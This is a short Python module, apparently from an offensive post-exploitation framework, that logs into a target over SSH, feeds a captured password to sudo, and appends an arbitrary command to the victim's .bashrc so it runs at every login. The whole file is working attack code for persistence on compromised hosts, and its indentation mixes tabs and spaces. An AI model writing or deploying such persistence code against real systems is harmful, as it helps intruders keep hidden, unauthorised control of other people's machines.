from module import *

class Startup(Module):

    def __init__(self, target, command, core):
        self.core = core
        self.target = target
        self.name = "startup"
        self.command = command
        self.options = {
                "bash": Option("bash", "true", "Add to bashrc", False),
                }

    def exploit(self, command):
	if(self.get_value("bash")):
            self.target.ssh.exec_command("nohup echo " + self.target.pword + " | sudo -S echo \'" + self.command + " & \' >> .bashrc")
        print(GOOD + self.name + " module success")

